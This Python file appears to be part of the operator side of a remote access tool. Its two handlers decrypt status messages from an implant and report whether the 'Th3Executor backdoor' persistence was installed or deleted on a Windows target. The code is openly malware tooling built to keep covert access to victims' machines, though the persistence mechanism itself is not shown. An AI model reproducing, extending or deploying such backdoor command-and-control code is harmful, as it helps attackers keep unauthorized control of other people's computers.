from components.networking import decrypt_message
from components.logging import log_activity

def persist_del_command(client_output):
    decrypted_client_message = decrypt_message(client_output).decode()
    if decrypted_client_message == "no_exist":
        return colored("[-] No persistance is currently active on the machine", "red")
    elif decrypted_client_message == "permission_denied":
        return colored("[-] Unable to delete : Permission Denied", "red")
    
    if decrypted_client_message == "success":
        return colored("[+] Persistance successfully deleted from target machine", "green")
    elif decrypted_client_message == "fail":
        return colored("[-] An unknown error has occured when trying to delete persistance", "red")
    
    return colored("[-] Unable to parse persistance output. This operation may or may not have worked", "red")

def persist_command(client_output):  
    decrypted_client_message = decrypt_message(client_output).decode()
    if decrypted_client_message == "created":
        log_activity("Th3Executor backdoor installed successfully on target machine. Persistance is now active.", "info")
        return colored("[+] Th3Executor backdoor installed successfully on target machine. Persistance is now active", "green")
    elif decrypted_client_message == "not_windows":
        log_activity("Target is not using a windows machine, persistance will not work.", "error")
        return colored("[-] Target is not using a windows machine, persistance will not work", "red")
    elif decrypted_client_message == "already_created":
        log_activity("Target already has persistance active on machine.", "debug")
        return colored("[-] Target already has persistance active", "red")
    else:        
        log_activity("An unidentified error has occured when attempting to create persistance.", "error")
        return colored("[-] An unidentified error has occured when attempting to create persistance", "red")  